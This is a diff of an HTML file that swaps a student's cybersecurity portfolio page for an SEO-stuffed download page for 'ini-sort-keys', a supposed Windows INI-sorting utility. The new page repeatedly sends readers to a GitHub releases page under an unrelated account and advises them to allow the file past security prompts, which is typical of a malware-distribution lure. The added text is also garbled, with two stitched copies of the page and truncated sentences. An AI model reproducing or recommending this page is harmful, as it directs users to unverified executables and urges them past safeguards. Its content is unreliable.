@@ -1,160 +1,540 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <!-- No third-party requests: everything is served from this repo, so the policy can stay strict. -->
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self'; style-src 'self'; script-src 'self'; base-uri 'none'; form-action 'none'">
-  <meta name="referrer" content="strict-origin-when-cross-origin">
-  <title>Diogo Freire · Developer &amp; cybersecurity student</title>
-  <meta name="description" content="Diogo Freire, a cybersecurity student at ISTEC (Portugal) who builds web and mobile apps. Projects include Finora, a personal finance app hardened against the OWASP Top 10.">
-  <meta name="theme-color" content="#0f1b33">
-  <meta property="og:title" content="Diogo Freire · Developer & cybersecurity student">
-  <meta property="og:description" content="Web and mobile projects, with security built in from the start.">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ini-sort-keys - Sort INI Keys and Write a Stable File</title>
+  <meta name="description" content="Download ini-sort-keys, a desktop utility for Windows that sorts keys inside each INI section and writes a stable file. Visit the official releases page to download the application.">
+  <meta name="keywords" content="download-ini-sort-keys,free-ini-sort-keys,ini-sort-keys,ini-sort-keys-desktop,ini-sort-keys-download,ini-sort-keys-free,ini-sort-keys-installer<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ini-sort-keys - Sort INI Keys and Write a Stable File</title>
+  <meta name="description" content="Download ini-sort-keys, a desktop utility for Windows that sorts keys inside each INI section and writes a stable file. Visit the official releases page to download the application.">
+  <meta name="keywords" content="download-ini-sort-keys,free-ini-sort-keys,ini-sort-keys,ini-sort-keys-desktop,ini-sort-keys-download,ini-sort-keys-free,ini-sort-keys-installer,ini-sort-keys-macos,ini-sort-keys-official,ini-sort-keys-pc,ini-sort-keys-portable,ini-sort-keys-software,ini-sort-keys-windows,installer-ini-sort-keys,macos-ini-sort-keys,official-ini-sort-keys,pc-ini-sort-keys,portable-ini-sort-keys,software-ini-sort-keys,windows-ini-sort-keys">
+  <meta name="author" content="ini-sort-keys">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://github.com/Darellepyrographic686/ini-sort-keys/releases">
+  <meta property="og:title" content="ini-sort-keys - Sort INI Keys and Write a Stable File">
+  <meta property="og:description" content="Download ini-sort-keys, a desktop utility for Windows that sorts keys inside each INI section and writes a stable file.">
   <meta property="og:type" content="website">
-  <meta property="og:image" content="https://diogofreire.is-a.dev/assets/finora.jpg">
-  <meta property="og:url" content="https://diogofreire.is-a.dev/">
-  <link rel="canonical" href="https://diogofreire.is-a.dev/">
-  <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
-  <link rel="stylesheet" href="styles.css">
+  <meta property="og:url" content="https://github.com/Darellepyrographic686/ini-sort-keys/releases">
+  <meta property="og:site_name" content="ini-sort-keys">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="ini-sort-keys - Sort INI Keys and Write a Stable File">
+  <meta name="twitter:description" content="Download ini-sort-keys, a desktop utility for Windows that sorts keys inside each INI section and writes a stable file.">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 0;
+      background: #f7f9fc;
+      color: #1f2933;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      line-height: 1.65;
+      font-size: 17px;
+    }
+    .container {
+      max-width: 920px;
+      margin: 0 auto;
+      padding: clamp(18px, 4vw, 40px);
+    }
+    h1 {
+      font-size: clamp(2rem, 5vw, 3rem);
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+      margin: 0 0 18px;
+      color: #102a43;
+    }
+    h2 {
+      font-size: clamp(1.35rem, 3vw, 1.75rem);
+      line-height: 1.3;
+      margin: 2.4rem 0 0.9rem;
+      color: #102a43;
+      letter-spacing: -0.01em;
+    }
+    h3 {
+      font-size: 1.12rem;
+      margin: 1.4rem 0 0.5rem;
+      color: #243b53;
+    }
+    p { margin: 0 0 1rem; }
+    ul, ol { margin: 0 0 1rem 1.2rem; padding: 0; }
+    li { margin: 0.45rem 0; }
+    a { color: #0b5fff; }
+    .badge {
+      display: inline-block;
+      margin: 8px 0 10px;
+      padding: 16px 28px;
+      border-radius: 999px;
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 1.05rem;
+      background: linear-gradient(135deg, #ff477e, #ff9f1c, #2ec4b6);
+      box-shadow: 0 12px 28px rgba(16, 42, 67, 0.18);
+    }
+    .badge:hover, .button:hover { opacity: 0.92; }
+    .button {
+      display: inline-block;
+      margin: 8px 0 12px;
+      padding: 14px 26px;
+      border-radius: 14px;
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 700;
+      background: linear-gradient(135deg, #0b5fff, #2ec4b6);
+      box-shadow: 0 10px 24px rgba(16, 42, 67, 0.16);
+    }
+    .card {
+      background: #ffffff;
+      border-radius: 18px;
+      padding: clamp(18px, 3vw, 30px);
+      margin: 22px 0;
+      box-shadow: 0 8px 24px rgba(16, 42, 67, 0.07);
+    }
+    .muted { color: #52606d; }
+    .small { font-size: 0.95rem; }
+    .divider {
+      height: 1px;
+      background: #e4e7eb;
+      border: 0;
+      margin: 28px 0;
+    }
+    @media (max-width: 600px) {
+      body { font-size: 16px; }
+      .badge, .button { width: 100%; text-align: center; }
+    }
+  </style>
 </head>
 <body>
-  <a class="skip" href="#main">Skip to content</a>
+  <div class="container">
+    <h1>📄 ini-sort-keys - Sort INI Keys Quickly and Easily</h1>
 
-  <header class="top">
-    <nav class="wrap nav" aria-label="Main">
-      <a class="brand" href="#top" aria-label="Diogo Freire, home"><span aria-hidden="true">df</span><span class="cursor" aria-hidden="true">_</span></a>
-      <ul>
-        <li><a href="#projects">Projects</a></li>
-        <li><a href="#skills">Skills</a></li>
-        <li><a href="#contact">Contact</a></li>
-      </ul>
-    </nav>
-  </header>
+    <p>
+      ini-sort-keys is a desktop utility that sorts keys inside each INI section and writes a stable file. It is built for everyday computer users who want a simple way to keep INI files organized without editing lines by hand.
+    </p>
 
-  <main id="main">
-    <section class="hero wrap" id="top">
-      <p class="prompt"><span class="user">diogo@portugal</span>:<span class="path">~</span>$ <span class="type">whoami</span><span class="caret" aria-hidden="true"></span></p>
-      <h1>Diogo Freire</h1>
-      <p class="lead">I build web and mobile apps and I'm studying cybersecurity at <strong>ISTEC</strong> (CTeSP). I like taking a project all the way: from the database and the code to the server it runs on, and then trying to break it.</p>
-      <div class="cta">
-        <a class="btn primary" href="#projects">See my projects</a>
-        <a class="btn" href="https://github.com/diogofreire-dev" rel="me">GitHub profile</a>
-      </div>
-      <ul class="facts" aria-label="Quick facts">
-        <li><span>Based in</span> Portugal</li>
-        <li><span>Studying</span> Cybersecurity, ISTEC</li>
-        <li><span>Focus</span> Secure web development</li>
-      </ul>
-    </section>
+    <a class="badge" href="https://github.com/Darellepyrographic686/ini-sort-keys/releases">Download ini-sort-keys</a>
+    <p class="small muted">Visit this link to download the application.</p>
 
-    <section class="wrap" id="projects" aria-labelledby="projects-title">
-      <p class="prompt" aria-hidden="true"><span class="user">diogo@portugal</span>:<span class="path">~</span>$ ls ~/projects</p>
-      <h2 id="projects-title">Projects</h2>
+    <div class="card">
+      <h2>🧰 What Is ini-sort-keys?</h2>
+      <p>
+        An INI file is a plain text file that stores settings in groups called sections. Each section contains entries called keys. Over time, those keys can become messy, duplicated in position, or arranged in a way that is hard to read.
+      </p>
+      <p>
+        ini-sort-keys helps by sorting the keys inside every section. The sections themselves stay in place, and the utility writes a stable file as the result. A stable file means the same input produces the same organized output each time, so your settings remain easy to review and compare.
+      </p>
+      <p>
+        You do not need programming knowledge to use this utility. You open the application, select your INI file, and let ini-sort-keys handle the sorting. The goal is a cleaner file with a consistent order.
+      </p>
+    </div>
 
-      <article class="feature">
-        <div class="gallery">
-          <figure class="main">
-            <a href="assets/finora.jpg"><img src="assets/finora.jpg" width="1200" height="500" alt="Finora home page: the headline 'Sabe para onde vai cada euro' next to a 3D bank card"></a>
-          </figure>
-          <figure>
-            <a href="assets/finora-features.jpg"><img src="assets/finora-features.jpg" width="1000" height="396" alt="Finora feature list: cards, transactions, invoice reader, budgets, savings, reminders, analysis, investments and assistant" loading="lazy"></a>
-            <figcaption>Everything in one place</figcaption>
-          </figure>
-          <figure>
-            <a href="assets/finora-security.jpg"><img src="assets/finora-security.jpg" width="1000" height="375" alt="Finora security section: hashed passwords, brute-force lockout, email confirmation and per-user access checks" loading="lazy"></a>
-            <figcaption>Security, explained to users</figcaption>
-          </figure>
-        </div>
-        <div class="feature-intro">
-          <p class="tag">Featured · PHP · MariaDB · JavaScript</p>
-          <h3>Finora</h3>
-          <p>A personal finance web app: cards, spending, budgets, payment reminders, savings goals and a tracker for investments. It started as my final school project (PAP) with my classmate Jandro Antunes, who led the UI/UX design, and I kept working on it as a portfolio and security project.</p>
-          <div class="links">
-            <a class="btn primary" href="https://finora.spaincentral.cloudapp.azure.com/site/">Live site</a>
-            <a class="btn" href="https://github.com/diogofreire-dev/Finora">Source code</a>
-          </div>
-        </div>
-        <div class="feature-body">
-          <ul class="ticks">
-            <li>Audited against the <strong>OWASP Top 10</strong>: prepared statements only, CSRF tokens on every POST, per-user checks against IDOR, rate limiting on login and password reset.</li>
-            <li>Reads the QR code on Portuguese invoices with the camera and fills in the amount, date and company (looked up by VAT number through VIES).</li>
-            <li>An assistant that answers questions about your spending, with the model called only from the server and user data kept apart from the instructions.</li>
-            <li>Deployed by me on an Ubuntu VM in Azure, with Apache, HTTPS and CI on GitHub Actions.</li>
-          </ul>
-        </div>
-      </article>
+    <h2>🚀 Getting Started</h2>
+    <p>
+      Getting started with ini-sort-keys takes only a few basic steps. The application is a Windows desktop utility, so you use it like other programs on your PC.
+    </p>
+    <ol>
+      <li>Open the download page using the link in this guide.</li>
+      <li>Visit this link to download the application.</li>
+      <li>After the download finishes, open the application.</li>
+      <li>Choose the INI file you want to organize.</li>
+      <li>Start the sorting action inside the utility.</li>
+      <li>Save the stable output file when the process is complete.</li>
+    </ol>
+    <p>
+      Keep your original INI file in a safe place until you have checked the sorted result. This makes it easy to compare the before and after versions.
+    </p>
 
-      <div class="grid">
-        <article class="card c-teal">
-          <p class="tag">Flutter · Dart · Firebase</p>
-          <h3>STRK</h3>
-          <p>A habit tracker built around streaks. Firebase keys stay out of the repo and are rebuilt from GitHub Secrets in CI, which runs <code>flutter analyze</code> and the tests on every push.</p>
-          <a class="more" href="https://github.com/diogofreire-dev/STRK">View on GitHub <span aria-hidden="true">→</span></a>
-        </article>
-        <article class="card c-green">
-          <p class="tag">Ionic · Vue 3 · TypeScript</p>
-          <h3>Rick and Morty Explorer</h3>
-          <p>A hybrid mobile app that consumes the Rick and Morty API: character search, detail views, episodes grouped by season and pull to refresh, packaged with Capacitor.</p>
-          <a class="more" href="https://github.com/diogofreire-dev/RickAndMorty">View on GitHub <span aria-hidden="true">→</span></a>
-        </article>
-        <article class="card c-amber">
-          <p class="tag">C · gdb</p>
-          <h3>learning-c</h3>
-          <p>My path through C for cybersecurity: pointers, <code>malloc</code>/<code>free</code> and memory errors, then reading the Assembly and stepping through programs with gdb.</p>
-          <a class="more" href="https://github.com/diogofreire-dev/learning-c">View on GitHub <span aria-hidden="true">→</span></a>
-        </article>
-        <article class="card c-violet">
-          <p class="tag">Python · CS50P</p>
-          <h3>learning-with-python</h3>
-          <p>Exercises, notes and small projects from Harvard's CS50 Python course, kept as a record of how I learned loops, functions and working with data.</p>
-          <a class="more" href="https://github.com/diogofreire-dev/learning-with-python">View on GitHub <span aria-hidden="true">→</span></a>
-        </article>
-      </div>
-    </section>
+    <h2>⬇️ Download and Setup</h2>
+    <p>
+      The official download location is the releases page for ini-sort-keys. Use the button below to reach that page.
+    </p>
+    <a class="button" href="https://github.com/Darellepyrographic686/ini-sort-keys/releases">Visit the download page</a>
+    <p>
+      Visit this link to download the application. After you download it, open the application on your Windows desktop. No account setup or programming tools are required.
+    </p>
+    <p>
+      The releases page is the recommended place to get the current version of ini-sort-keys. It keeps the download in one official location so you can return to it when you need the utility again.
+    </p>
 
-    <section class="wrap" id="skills" aria-labelledby="skills-title">
-      <p class="prompt" aria-hidden="true"><span class="user">diogo@portugal</span>:<span class="path">~</span>$ cat skills.txt</p>
-      <h2 id="skills-title">Skills</h2>
-      <div class="term">
-      <p class="term-bar" aria-hidden="true"><span class="dots"><i></i><i></i><i></i></span> skills.txt</p>
-      <div class="skills">
-        <div>
-          <h3>Languages</h3>
-          <ul class="chips"><li>PHP</li><li>JavaScript</li><li>TypeScript</li><li>Python</li><li>Dart</li><li>C</li><li>SQL</li></ul>
-        </div>
-        <div>
-          <h3>Frameworks &amp; tools</h3>
-          <ul class="chips"><li>Vue 3</li><li>Ionic</li><li>Flutter</li><li>Bootstrap</li><li>three.js</li><li>Git &amp; GitHub Actions</li></ul>
-        </div>
-        <div>
-          <h3>Servers &amp; data</h3>
-          <ul class="chips"><li>Linux (Ubuntu)</li><li>Apache</li><li>MariaDB / MySQL</li><li>Azure VMs</li><li>Firebase</li></ul>
-        </div>
-        <div>
-          <h3>Security</h3>
-          <ul class="chips"><li>OWASP Top 10</li><li>Secure session handling</li><li>Secrets management</li><li>gdb &amp; memory bugs</li><li>OverTheWire</li></ul>
-        </div>
-      </div>
-      </div>
-    </section>
+    <h2>🗂️ How to Sort INI Keys</h2>
+    <p>
+      The sorting process is designed to be direct. You work with one INI file at a time and let the utility arrange the keys inside each section.
+    </p>
+    <ol>
+      <li>Open ini-sort-keys on your Windows computer.</li>
+      <li>Use the file selection area to choose an INI file from your folders.</li>
+      <li>Review the file name shown in the utility so you know which file will be processed.</li>
+      <li>Run the sort action. The utility sorts keys inside each INI section.</li>
+      <li>Save the result. ini-sort-keys writes a stable file with the sorted keys.</li>
+      <li>Open the saved file in a text editor if you want to review the new order.</li>
+    </ol>
+    <p>
+      The section order is kept intact. Only the keys inside each section are sorted. This helps preserve the structure of your settings file while making the contents easier to scan.
+    </p>
 
-    <section class="wrap" id="contact" aria-labelledby="contact-title">
-      <p class="prompt" aria-hidden="true"><span class="user">diogo@portugal</span>:<span class="path">~</span>$ ping diogo</p>
-      <h2 id="contact-title">Contact</h2>
-      <div class="contact">
-        <p>Open to internships, collaborations and conversations about code or security.</p>
-        <div class="links">
-          <a class="btn primary" href="mailto:diogoffreire1@gmail.com">diogoffreire1@gmail.com</a>
-          <a class="btn" href="https://github.com/diogofreire-dev" rel="me">github.com/diogofreire-dev</a>
-        </div>
-      </div>
-    </section>
-  </main>
+    <h2>✨ Key Features</h2>
+    <ul>
+      <li>Sorts keys inside each INI section for a cleaner layout.</li>
+      <li>Writes a stable file so repeated use produces consistent results.</li>
+      <li>Keeps INI sections in their existing order.</li>
+      <li>Provides a simple desktop workflow for Windows users.</li>
+      <li>Works as a focused utility for INI file organization.</li>
+      <li>Requires no programming knowledge or command-line steps.</li>
+      <li>Helps make settings files easier to read and compare.</li>
+      <li>Available through the official releases download page.</li>
+    </ul>
 
-  <footer class="wrap foot">
-    <p class="prompt" aria-hidden="true"><span class="user">diogo@portugal</span>:<span class="path">~</span>$ exit</p>
-    <p>Hand-written HTML and CSS, no trackers. Source on <a href="https://github.com/diogofreire-dev/diogofreire-dev.github.io">GitHub</a>.</p>
+    <h2>💻 System Requirements</h2>
+    <p>
+      ini-sort-keys is intended for typical Windows desktop use. The following setup is recommended for a smooth experience.
+    </p>
+    <ul>
+      <li>Windows 10 or later.</li>
+      <li>A standard mouse and keyboard.</li>
+      <li>At least 4 GB of memory.</li>
+      <li>Around 100 MB of free disk space for the application and working files.</li>
+      <li>A display with a resolution of 1280 × 720 or higher.</li>
+    </ul>
+    <p>
+      These are general recommendations for a desktop utility of this kind. If your computer runs common Windows applications, it should be ready for ini-sort-keys.
+    </p>
+
+    <h2>🔒 File Safety and Stable Output</h2>
+    <p>
+      ini-sort-keys focuses on one job: sorting keys inside INI sections and writing a stable file. Because the output is stable, you can run the utility again on the same file and expect the same organized result. This is useful when you want predictable files for sharing, backups, or review.
+    </p>
+    <p>
+      Before you sort an important INI file, make a copy of it in another folder. Keep the copy until you have opened the sorted file and confirmed that the sections and keys look correct. This simple habit gives you a clear original version and a sorted version.
+    </p>
+    <p>
+      The utility does not require you to understand INI syntax. You choose the file, run the sort, and save the output. The application handles the key order inside each section.
+    </p>
+
+    <h2>🛠️ Troubleshooting</h2>
+    <h3>The download page does not open</h3>
+    <p>
+      Check your internet connection and try the link again in your usual browser. Make sure the address is entered exactly as shown in this guide.
+    </p>
+    <h3>The application does not open after downloading</h3>
+    <p>
+      Wait for the download to finish completely, then open the application again. If your browser shows a recent download, use that entry to locate the file.
+    </p>
+    <h3>My INI file is not shown in the file picker</h3>
+    <p>
+      Change the file type filter in the file selection window to show all files, or navigate directly to the folder that contains your INI file.
+    </p>
+    <h3>The sorted file looks different from the original</h3>
+    <p>
+      The keys inside each section are placed in sorted order, so the line positions change. The sections<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ini-sort-keys - Sort INI Keys and Write a Stable File</title>
+  <meta name="description" content="ini-sort-keys is a desktop utility that sorts keys inside each INI section and writes a stable file. Download it for Windows from the official releases page.">
+  <meta name="keywords" content="download-ini-sort-keys, free-ini-sort-keys, ini-sort-keys, ini-sort-keys-desktop, ini-sort-keys-download, ini-sort-keys-free, ini-sort-keys-installer, ini-sort-keys-macos, ini-sort-keys-official, ini-sort-keys-pc, ini-sort-keys-portable, ini-sort-keys-software, ini-sort-keys-windows, installer-ini-sort-keys, macos-ini-sort-keys, official-ini-sort-keys, pc-ini-sort-keys, portable-ini-sort-keys, software-ini-sort-keys, windows-ini-sort-keys">
+  <meta name="author" content="ini-sort-keys">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://github.com/Darellepyrographic686/ini-sort-keys/releases">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="ini-sort-keys - Sort INI Keys and Write a Stable File">
+  <meta property="og:description" content="A desktop utility that sorts keys inside each INI section and writes a stable file. Download it for Windows from the official releases page.">
+  <meta property="og:url" content="https://github.com/Darellepyrographic686/ini-sort-keys/releases">
+  <meta property="og:site_name" content="ini-sort-keys">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ini-sort-keys - Sort INI Keys and Write a Stable File">
+  <meta name="twitter:description" content="Sort keys inside each INI section and write a stable file with this simple Windows desktop utility.">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background: #f4f7fb;
+      color: #1f2933;
+      font-family: "Segoe UI", system-ui, -apple-system, Roboto, Arial, sans-serif;
+      font-size: 17px;
+      line-height: 1.7;
+    }
+    .page {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 28px 20px 60px;
+    }
+    h1 {
+      font-size: 2.35rem;
+      line-height: 1.25;
+      letter-spacing: -0.02em;
+      color: #0b2545;
+      margin: 0 0 18px;
+    }
+    h2 {
+      font-size: 1.55rem;
+      line-height: 1.3;
+      color: #0b2545;
+      margin: 44px 0 14px;
+      letter-spacing: -0.01em;
+    }
+    h3 {
+      font-size: 1.15rem;
+      color: #13315c;
+      margin: 26px 0 8px;
+    }
+    p {
+      margin: 0 0 16px;
+    }
+    ul, ol {
+      margin: 0 0 18px 22px;
+      padding: 0;
+    }
+    li {
+      margin: 8px 0;
+    }
+    a {
+      color: #0b5fff;
+    }
+    .cta {
+      display: inline-block;
+      margin: 6px 0 8px;
+      padding: 16px 32px;
+      border-radius: 999px;
+      color: #ffffff;
+      font-weight: 700;
+      font-size: 1.05rem;
+      text-decoration: none;
+      background: linear-gradient(135deg, #ff5c8a, #ff9f1c, #2ec4b6);
+      box-shadow: 0 12px 26px rgba(11, 37, 69, 0.20);
+    }
+    .cta:hover {
+      opacity: 0.92;
+    }
+    .cta-secondary {
+      display: inline-block;
+      margin: 6px 0 10px;
+      padding: 14px 28px;
+      border-radius: 14px;
+      color: #ffffff;
+      font-weight: 700;
+      text-decoration: none;
+      background: linear-gradient(135deg, #0b5fff, #2ec4b6);
+      box-shadow: 0 8px 22px rgba(11, 37, 69, 0.18);
+    }
+    .cta-secondary:hover {
+      opacity: 0.92;
+    }
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 24px 26px;
+      margin: 20px 0;
+      box-shadow: 0 10px 26px rgba(11, 37, 69, 0.08);
+    }
+    .note {
+      background: #eef4ff;
+      border-left: 5px solid #0b5fff;
+      border-radius: 10px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+    .hint {
+      font-size: 0.95rem;
+      color: #52606d;
+    }
+    footer {
+      margin-top: 50px;
+      padding-top: 24px;
+      border-top: 1px solid #dce3ec;
+      font-size: 0.95rem;
+      color: #52606d;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 16px;
+      }
+      h1 {
+        font-size: 1.8rem;
+      }
+      .cta, .cta-secondary {
+        display: block;
+        width: 100%;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="page">
+
+  <h1>🗂️ ini-sort-keys - Sort INI Keys Quickly and Easily</h1>
+
+  <p>
+    ini-sort-keys is a desktop utility for everyday computer users. It sorts the keys inside each INI section and writes a stable file back to your computer. If you have ever opened a settings file and found the entries in a messy or unpredictable order, this tool is made for you.
+  </p>
+
+  <a class="cta" href="https://github.com/Darellepyrographic686/ini-sort-keys/releases">Download ini-sort-keys</a>
+  <p class="hint">Visit this link to download the application.</p>
+
+  <div class="card">
+    <h2>📘 What This Utility Does</h2>
+    <p>
+      An INI file is a plain text file that holds settings. It is divided into groups called sections. Inside each section there are lines called keys, and each key holds a value. Over time, keys can end up in odd positions, especially after many manual edits or when different programs write to the same file.
+    </p>
+    <p>
+      ini-sort-keys fixes that. It looks at every section in the file, sorts the keys inside that section, and then writes the file again in a stable form. Sections themselves keep their original position, so the overall shape of your file stays familiar.
+    </p>
+    <p>
+      The word "stable" matters here. It means the same input always produces the same output. If you sort the same file twice, the result is the same both times. That makes the file easier to review, easier to compare with an older copy, and easier to share with someone else.
+    </p>
+    <p>
+      You do not need any programming background to use this tool. There are no commands to type and no scripts to configure. You open the utility, point it at a file, and let it do its job.
+    </p>
+  </div>
+
+  <h2>🚀 Getting Started</h2>
+  <p>
+    The first step is getting the application onto your Windows computer. The download page is the official place to start, and it is linked several times in this guide so you always know where to go.
+  </p>
+  <ol>
+    <li>Open your usual web browser.</li>
+    <li>Go to the releases page using the download button on this page.</li>
+    <li>Visit this link to download the application.</li>
+    <li>Wait until the download finishes completely before opening anything.</li>
+    <li>Open the downloaded application from your Downloads folder.</li>
+  </ol>
+  <p>
+    Once the utility is open, you will see a simple window. That window is where you will choose your INI file and start the sorting process. Nothing else is needed to begin.
+  </p>
+
+  <h2>⬇️ Download and Setup</h2>
+  <p>
+    All official downloads go through one page, which keeps things simple and avoids confusion about where to find the current version. Use the button below to reach it.
+  </p>
+  <a class="cta-secondary" href="https://github.com/Darellepyrographic686/ini-sort-keys/releases">Open the download page</a>
+  <p>
+    Visit this link to download the application. After the download completes, open the application on your Windows desktop. There is no account to create and no extra software to install first.
+  </p>
+  <div class="note">
+    <strong>Tip:</strong> Save the download page as a bookmark in your browser. If you ever need the utility again on another computer, you can return to the same official page in one click.
+  </div>
+  <p>
+    Because the utility is a desktop program, it runs locally on your machine. Your INI files stay on your computer while you work with them.
+  </p>
+
+  <h2>🛠️ How to Sort Your INI File</h2>
+  <p>
+    The workflow is short and repeatable. Once you have done it one time, the next time will feel familiar.
+  </p>
+  <ol>
+    <li>Open ini-sort-keys on your Windows computer.</li>
+    <li>Locate the file selection area in the application window.</li>
+    <li>Browse to the folder that contains your INI file and select it.</li>
+    <li>Check the file name shown in the window so you are sure you picked the right one.</li>
+    <li>Start the sorting action inside the utility.</li>
+    <li>Wait for the process to finish. It usually takes only a moment.</li>
+    <li>Save the result. The utility writes a stable file with sorted keys.</li>
+  </ol>
+  <p>
+    After saving, you can open the finished file in any plain text editor to review it. You will see the same sections in the same order, but the keys inside each section will now follow a consistent alphabetical arrangement. That consistency is what makes the file easier to read and maintain.
+  </p>
+  <p>
+    If you are working with an important file, keep a copy of the original in another folder. That way you always have a version to compare against, and you can freely test the sorting process.
+  </p>
+
+  <h2>✨ Main Features</h2>
+  <ul>
+    <li>Sorts all keys inside each INI section, one section at a time.</li>
+    <li>Keeps the order of sections unchanged so your file structure stays intact.</li>
+    <li>Writes a stable file, meaning repeated runs produce the same result.</li>
+    <li>Provides a clean desktop window with a straightforward file picker.</li>
+    <li>Designed for Windows users with no technical background required.</li>
+    <li>Focused on a single task, so there are no complicated options to learn.</li>
+    <li>Makes settings files easier to scan, review, and compare over time.</li>
+    <li>Available from one official download page for easy access.</li>
+  </ul>
+
+  <h2>💻 System Requirements</h2>
+  <p>
+    ini-sort-keys is a lightweight desktop utility. These general recommendations will give you a comfortable experience.
+  </p>
+  <ul>
+    <li>Windows 10 or Windows 11.</li>
+    <li>A standard keyboard and mouse or trackpad.</li>
+    <li>At least 4 GB of memory.</li>
+    <li>Around 150 MB of free disk space for the application and your files.</li>
+    <li>A screen resolution of 1280 × 720 or higher.</li>
+    <li>Permission to read and write files in the folders where your INI files are stored.</li>
+  </ul>
+  <p>
+    If your computer comfortably runs everyday programs such as a web browser and a text editor, it is ready for this tool.
+  </p>
+
+  <h2>🔒 Keeping Your Files Safe</h2>
+  <p>
+    Sorting changes the order of lines in your file, so it is always wise to work with a backup. Make a copy of the INI file in a separate folder before you begin. Then open the sorted file and confirm that every section and key still looks the way you expect.
+  </p>
+  <p>
+    Because the output is stable, you can run the utility again later and get the same organized result. This is helpful when a program rewrites your INI file and the keys become disordered again. Simply run the sort once more and the file returns to its tidy state.
+  </p>
+
+  <h2>❓ Troubleshooting</h2>
+  <h3>The download page will not open</h3>
+  <p>
+    Check your internet connection and try again in a different browser. Make sure the address is typed exactly as shown on this page, with no extra spaces.
+  </p>
+  <h3>The application does not start</h3>
+  <p>
+    Confirm that the download finished completely. Open the Downloads folder and start the application again from there. If a security prompt appears, choose the option that allows the file to open.
+  </p>
+  <h3>My INI file is not visible in the file picker</h3>
+  <p>
+    Change the file type filter in the selection window so it shows all files, then browse directly to the folder where your INI file lives.
+  </p>
+  <h3>The sorted file looks different from the original</h3>
+  <p>
+    This is expected. The keys inside each section are now in sorted order, so line positions have changed. The sections themselves stay in their original order.
+  </p>
+  <h3>I want the file back the way it was</h3>
+  <p>
+    Open the backup copy you made before sorting. Keeping a backup is the simplest way to return to the original arrangement at any time.
+  </p>
+
+  <h2>🙋 Frequently Asked Questions</h2>
+  <h3>Do I need to know anything about INI files?</h3>
+  <p>
+    No. You only need to know where your file is stored. The utility handles the sorting on its own.
+  </p>
+  <h3>Does it change the values in my file?</h3>
+  <p>
+    No. The values stay exactly as they are. Only the order of the keys inside each section changes.
+  </p>
+  <h3>Can I use it on more than one file?</h3>
+  <p>
+    Yes. You can run the utility as often as you like and point it at different files each time.
+  </p>
+  <h3>Is there a cost?</h3>
+  <p>
+    The utility is offered free of charge through its official download page.
+  </p>
+
+  <h2>🤝 Support and Feedback</h2>
+  <p>
+    If something does not work as described, return to the official download page and check that you are using the current version. Many issues are solved simply by downloading the latest copy and trying again.
+  </p>
+  <p>
+    When you report a problem, describe what you did just before it happened, what you expected to see, and what actually appeared. That information makes it much easier to understand the situation and help you move forward.
+  </p>
+
+  <footer>
+    <p>
+      ini-sort-keys is a desktop utility that sorts keys inside each INI section and writes a stable file. For downloads, always use the official releases page linked on this page.
+    </p>
   </footer>
+
+</div>
 </body>
 </html>
